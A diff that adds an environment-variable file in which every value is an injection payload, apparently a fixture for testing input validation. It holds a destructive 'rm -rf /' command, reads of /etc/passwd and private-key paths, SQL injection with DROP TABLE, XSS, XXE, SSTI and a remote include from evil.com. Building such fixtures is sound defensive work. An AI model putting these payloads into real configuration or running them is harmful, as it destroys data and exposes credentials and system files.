@@ -1,0 +1,20 @@
+GEMINI_API_KEY=; rm -rf /; echo
+API_KEY=<script>alert('xss')</script>
+DATABASE_URL=postgresql://user:pass@evil.com:5432/db'; DROP TABLE users; --
+SECRET_KEY=../../../etc/passwd
+TOKEN=javascript:alert('xss')
+PRIVATE_KEY=<iframe src="javascript:alert('xss')">
+CERT_PATH=../../../../etc/ssl/private.key
+CONFIG_FILE=php://filter/convert.base64-encode/resource=/etc/passwd
+UPLOAD_PATH=../../../../var/www/html/shell.php
+COMMAND=; cat /etc/passwd
+EXEC_PATH=|/bin/bash -c 'cat /etc/passwd'
+EVAL_CODE=); system('cat /etc/passwd'); /*
+XSS_PAYLOAD=<img src=x onerror=alert('xss')>
+SQL_INJECTION=' OR '1'='1
+PATH_INJECTION=../../../etc/passwd
+LFI_PAYLOAD=php://input
+RFI_PAYLOAD=http://evil.com/malicious.php
+XXE_PAYLOAD=<!ENTITY xxe SYSTEM "file:///etc/passwd">
+TEMPLATE_INJECTION={{config.__class__.__mro__[1].__subclasses__()}}
+SSTI_PAYLOAD=${7*7}
